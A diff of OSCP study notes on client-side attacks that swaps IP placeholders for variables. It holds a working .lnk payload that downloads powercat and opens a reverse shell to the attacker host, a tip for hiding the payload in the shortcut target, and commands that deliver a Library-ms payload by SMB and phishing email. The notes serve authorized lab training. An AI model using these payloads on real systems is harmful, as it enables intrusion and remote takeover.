@@ -36,7 +36,7 @@ See [[12. Client-Side Attacks#Step 1: Set up a WebDAV share on Kali with WsgiDAV
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://<kali_ip></url>
+<url>http://$LocalIP</url>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
@@ -53,7 +53,7 @@ See [[12. Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.
 ## `.lnk` shortcut payload (PowerCat via PowerShell target)
 
 ```powershell
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$LocalIP:8000/powercat.ps1');powercat -c $LocalIP -p 4444 -e powershell"
 ```
 Set as a new shortcut's target (right-click desktop → New → Shortcut). Pad with a delimiter + benign command past 255 characters to hide it from a casual Properties check (target field holds up to 4096).
 
@@ -66,7 +66,7 @@ See [[12. Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the act
 ## Checking Mark of the Web (Zone.Identifier)
 
 ```powershell
-Get-Item -Path .\<file> -Stream Zone.Identifier
+Get-Item -Path .\$BoxDir -Stream Zone.Identifier
 ```
 *Returns the file's `Zone.Identifier` Alternate Data Stream if MOTW is present, e.g. `[ZoneTransfer]\nZoneId=3` (`3` = Internet zone). Windows tags anything that arrived over a network connection this way, including content delivered through a library file's WebDAV share, even though Explorer visually renders that content as an ordinary local folder. MOTW is implemented as an NTFS ADS specifically, so it can't attach to anything on a FAT32-formatted device, no mechanism for the tag to exist on.*
 
@@ -115,7 +115,7 @@ See [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]],
 ## RDP into a build/prep machine with clipboard + drive redirection
 
 ```bash
-xfreerdp /v:<target_ip> /u:offsec /p:lab /dynamic-resolution +clipboard /drive:kali,/home/kali
+xfreerdp /v:$BoxIP /u:offsec /p:lab /dynamic-resolution +clipboard /drive:kali,/home/kali
 ```
 *`+clipboard` enables clipboard sync (missing by default, needed for pasting macro/payload code into the session), `/drive:kali,/home/kali` maps your home directory as a network drive inside the session (for copying built payloads back out). Both flags are safe to combine into one connection from the start rather than reconnecting later for each.*
 
@@ -130,8 +130,8 @@ See [[12. Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OF
 ## Upload a payload to a target's SMB share (one-shot, non-interactive)
 
 ```bash
-smbclient //<target_ip>/share -c 'put config.Library-ms'
-smbclient //<target_ip>/share -c 'put ticket.doc'
+smbclient //$BoxIP/share -c 'put config.Library-ms'
+smbclient //$BoxIP/share -c 'put ticket.doc'
 ```
 *`-c '<command>'` runs a single command non-interactively instead of dropping into an interactive `smb: \>` prompt, useful for scripting a one-shot delivery.*
 
@@ -149,13 +149,13 @@ sudo swaks \
   --to target1@domain.com,target2@domain.com \
   --from sender@domain.com \
   --attach @config.Library-ms \
-  --server <mailserver-ip> \
+  --server $BoxIP \
   --body @body.txt \
   --header "Subject: Staging Script" \
   --suppress-data \
   -ap
-# Username: <smtp-user>
-# Password: <smtp-password>
+# Username: $Username
+# Password: $Password
 ```
 
 *`--suppress-data` avoids printing the raw MIME blob in the terminal. `-ap` enables SMTP AUTH (prompts interactively for user/password). `@file` prefix tells swaks to attach the file by path rather than using the literal string.*
@@ -181,3 +181,14 @@ This area grows alongside the module. Whenever a new client-side delivery mechan
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
